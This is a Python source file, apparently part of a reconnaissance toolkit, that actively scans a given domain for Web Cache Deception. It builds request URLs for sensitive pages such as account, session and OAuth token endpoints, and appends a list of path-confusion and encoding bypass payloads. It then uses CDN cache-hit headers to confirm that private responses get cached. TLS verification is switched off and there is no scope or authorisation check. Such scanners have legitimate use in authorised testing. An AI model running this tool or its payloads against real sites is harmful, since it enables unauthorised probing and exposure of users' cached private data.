#!/usr/bin/env python3
"""
Module: Edge Node Cache Deception
Actively tests discovered endpoints for Web Cache Deception (WCD)
by appending static extensions (e.g., ;/.css) and checking if
the response gets cached by the CDN.

Now self-generates high-value test URLs when no input is provided,
and includes expanded bypass payloads and cache poisoning headers.
"""

import argparse
import asyncio
import random
import string
import sys
import ssl
from pathlib import Path
from typing import List, Dict, Optional
from urllib.parse import urlparse

import aiohttp

sys.path.insert(0, str(Path(__file__).parent.parent))
from recon.config import Config
from recon.utils import log_info, log_success, log_warning, log_finding, banner, write_lines, read_lines, RateLimiter

# Expanded WCD payloads — classic + modern bypass techniques
WCD_PAYLOADS = [
    # Classic path confusion
    ".css",
    "/.css",
    ";/.css",
    ".js",
    "/.js",
    ";/.js",
    # URL encoding bypasses
    "%0A.css",
    "%23.css",
    "%3F.css",
    # Path parameter injection
    ";x=1.css",
    # Double-encoding
    "/%2e%2e/.css",
    "/..%2f.css",
    # Null byte (some parsers)
    "%00.css",
    # Semicolon path param (common in Java/Spring apps)
    ";.css",
    ";.js",
    ";.png",
]

# High-value paths to test when no URL list is provided
SENSITIVE_PATHS = [
    "/account",
    "/profile",
    "/settings",
    "/dashboard",
    "/api/me",
    "/api/user",
    "/api/v1/user",
    "/api/v1/me",
    "/api/v1/account",
    "/api/v2/user",
    "/user/info",
    "/user/profile",
    "/my-account",
    "/admin",
    "/api/config",
    "/api/session",
    "/graphql",
    "/oauth/token",
]


class CacheDeceptionScanner:
    def __init__(self, urls: List[str], domain: str = None):
        self.urls = urls
        self.domain = domain
        self.findings = []
        self.rate_limiter = RateLimiter(30)
        self._session = None

    async def _get_session(self):
        if self._session is None or self._session.closed:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            connector = aiohttp.TCPConnector(ssl=ssl_ctx)
            self._session = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=10))
        return self._session

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()

    def _detect_cdn(self, headers: dict) -> str:
        """Identify which CDN (if any) is serving the response."""
        h = {k.lower(): v.lower() for k, v in headers.items()}
        server = h.get("server", "")
        
        if "cloudflare" in server or "cf-cache-status" in h:
            return "Cloudflare"
        if "cloudfront" in h.get("x-cache", "") or "via" in h and "cloudfront" in h.get("via", ""):
            return "CloudFront"
        if "akamai" in server or "x-akamai" in " ".join(h.keys()):
            return "Akamai"
        if "fastly" in server or "x-fastly" in " ".join(h.keys()):
            return "Fastly"
        if "varnish" in server or "x-varnish" in h:
            return "Varnish"
        if "x-cache" in h:
            return "Unknown CDN"
        
        return ""

    def _is_cached(self, headers: dict) -> bool:
        """Heuristic to check if a response was cached by a CDN."""
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        
        # Cloudflare
        if headers_lower.get("cf-cache-status") in ("hit", "revalidated"):
            return True
        # Akamai / CloudFront / generic
        x_cache = headers_lower.get("x-cache", "")
        if "hit" in x_cache:
            return True
        # Generic Edge Cache
        if "hit" in headers_lower.get("x-edge-result", ""):
            return True
        # Fastly
        if "hit" in headers_lower.get("x-fastly-cache", ""):
            return True
        # Varnish
        x_varnish = headers_lower.get("x-varnish", "")
        if x_varnish and " " in x_varnish:  # Two IDs = cache hit
            return True
        # Age header implies it's cached (non-zero)
        age = headers_lower.get("age", "0")
        if age.isdigit() and int(age) > 0:
            return True
            
        return False

    def _generate_test_urls(self) -> List[str]:
        """Generate high-value test URLs from the domain when no URLs are provided."""
        if not self.domain:
            return []
        
        generated = []
        bases = [f"https://www.{self.domain}", f"https://{self.domain}"]
        
        for base in bases:
            for path in SENSITIVE_PATHS:
                generated.append(f"{base}{path}")
        
        log_info(f"Auto-generated {len(generated)} high-value test URLs for WCD scanning.")
        return generated

    async def _test_url(self, url: str) -> Optional[Dict]:
        """Test a single URL with cache deception payloads."""
        await self.rate_limiter.acquire()
        session = await self._get_session()
        
        parsed = urlparse(url)
        # Skip urls that already end in static extensions
        if parsed.path.endswith((".css", ".js", ".png", ".jpg", ".gif", ".ico", ".svg", ".woff", ".woff2")):
            return None

        # Generate a random cache buster to ensure we're the only one using this cache key
        cache_buster = ''.join(random.choices(string.ascii_lowercase, k=6))

        # Try WCD payloads
        for payload in WCD_PAYLOADS:
            test_url = url.rstrip("/") + f"/{cache_buster}" + payload
            try:
                # Request 1: Populate the cache with our request
                headers_1 = {
                    "User-Agent": Config.USER_AGENT,
                    "Pragma": "akamai-x-cache-on, akamai-x-cache-remote-on",
                    "X-Forwarded-Host": parsed.netloc,
                }
                async with session.get(test_url, headers=headers_1, allow_redirects=False) as resp1:
                    if resp1.status not in (200, 301, 302):
                        continue
                    
                    content_type = resp1.headers.get("Content-Type", "").lower()
                    resp1_headers = dict(resp1.headers)
                    
                    # Small delay to let cache propagate
                    await asyncio.sleep(0.3)
                    
                    # Request 2: Check if cached (different UA to prove it's not just our session)
                    headers_2 = {"User-Agent": "CacheDeceptionTest/1.0"}
                    async with session.get(test_url, headers=headers_2, allow_redirects=False) as resp2:
                        if resp2.status == 200:
                            is_cached = self._is_cached(dict(resp2.headers))
                            cdn = self._detect_cdn(resp1_headers)
                            
                            # If the response is cached AND contains dynamic content (not static), it's WCD
                            if is_cached and "text/css" not in content_type and "application/javascript" not in content_type:
                                return {
                                    "url": url,
                                    "wcd_url": test_url,
                                    "payload": payload,
                                    "status": resp2.status,
                                    "content_type": content_type,
                                    "cdn": cdn,
                                }
            except Exception:
                pass
        return None

    async def scan(self) -> List[Dict]:
        import time
        start = time.time()
        banner("Cache Deception Scanner")
        
        # Self-generate test URLs if none provided
        if not self.urls or all(u in [f"https://www.{self.domain}", f"https://{self.domain}"] for u in self.urls):
            self.urls = self._generate_test_urls()
        
        log_info(f"Testing {len(self.urls)} endpoints for Web Cache Deception...")
        
        # CDN detection on first URL
        if self.urls:
            session = await self._get_session()
            try:
                parsed = urlparse(self.urls[0])
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                async with session.get(base_url, allow_redirects=True) as resp:
                    cdn = self._detect_cdn(dict(resp.headers))
                    if cdn:
                        log_success(f"Detected CDN: {cdn}")
                    else:
                        log_warning("No major CDN detected. WCD may not apply, but testing anyway...")
            except Exception:
                pass
                
        tasks = [self._test_url(url) for url in self.urls]
        results = await asyncio.gather(*tasks)
        
        for res in results:
            if res:
                self.findings.append(res)
                log_finding(f"[WCD VULNERABLE] {res['url']} → {res['wcd_url']} (Cached as {res['content_type']}, CDN: {res['cdn']})")

        await self.close()
        log_success(f"Cache Deception scan completed in {time.time() - start:.2f}s. Found {len(self.findings)} vulnerable endpoints.")
        return self.findings

def main():
    parser = argparse.ArgumentParser(description="Web Cache Deception Scanner")
    parser.add_argument("-l", "--list", help="List of URLs to test")
    parser.add_argument("-d", "--domain", help="Target domain (auto-generates test URLs)")
    args = parser.parse_args()
    
    urls = []
    if args.list:
        urls = read_lines(args.list)
    
    if not urls and not args.domain:
        print("Provide --list or --domain.")
        return
        
    scanner = CacheDeceptionScanner(urls, domain=args.domain)
    asyncio.run(scanner.scan())

if __name__ == "__main__":
    main()
